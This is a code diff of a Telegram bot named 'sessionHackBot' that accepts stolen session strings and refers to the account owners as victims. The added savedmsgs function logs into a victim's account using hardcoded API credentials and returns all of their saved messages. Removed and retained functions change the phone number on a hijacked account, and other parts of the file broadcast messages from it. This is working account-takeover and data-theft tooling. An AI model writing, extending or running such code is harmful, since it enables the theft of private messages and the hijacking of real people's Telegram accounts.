@@ -1,4 +1,3 @@
-
 from SHRU import bot, l313l
 #By Source joker @SXYO3
 from telethon import events, functions, types, Button
@@ -15,38 +14,28 @@ from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
-from telethon import TelegramClient, sync
-from telethon.tl.functions.messages import GetAllSavedMessages
+
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
-from telethon.tl.types import InputMessagesFilterSaved
+
 bot = borg = tgbot
 
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 
-
 async def savedmsgs(strses):
-    try:
-        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-            saved_messages = []
-            async for message in X.iter_messages(entity='me', filter=InputMessagesFilterSaved()):
-                saved_messages.append(message.text)
-            return "\n".join(saved_messages)
-    except Exception as e:
-        print(f"Error: {e}")
-        return "Failed to fetch saved messages."
-async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    bot = client = X
-    try: 
-      result = await bot(functions.account.ChangePhoneRequest(
-        phone_number=number,
-        phone_code_hash=code,
-        phone_code=otp
-      ))
-      return True
-    except:
-      return False
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            messages = []
+            async for msg in X.iter_messages('me', reverse=True):
+                if msg.text:
+                    messages.append(msg.text)
+                elif msg.media and hasattr(msg.media, 'document'):
+                    # To handle media messages, you can add specific logic here
+                    pass
+            return "\n".join(messages)
+        except Exception as e:
+            print(e)
+            return "حدث خطأ "
 
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -744,16 +733,15 @@ async def users(event):
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"V")))
-
 async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("الان ارسل الكود تيرمكس")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-      i = await savedmsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس الساحر", buttons=keyboard)
-    
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+        
+        saved_messages = await savedmsgs(strses.text)
+        await event.reply(saved_messages + "\n\nشكرا لأستخدامك سورس الساحر", buttons=keyboard)
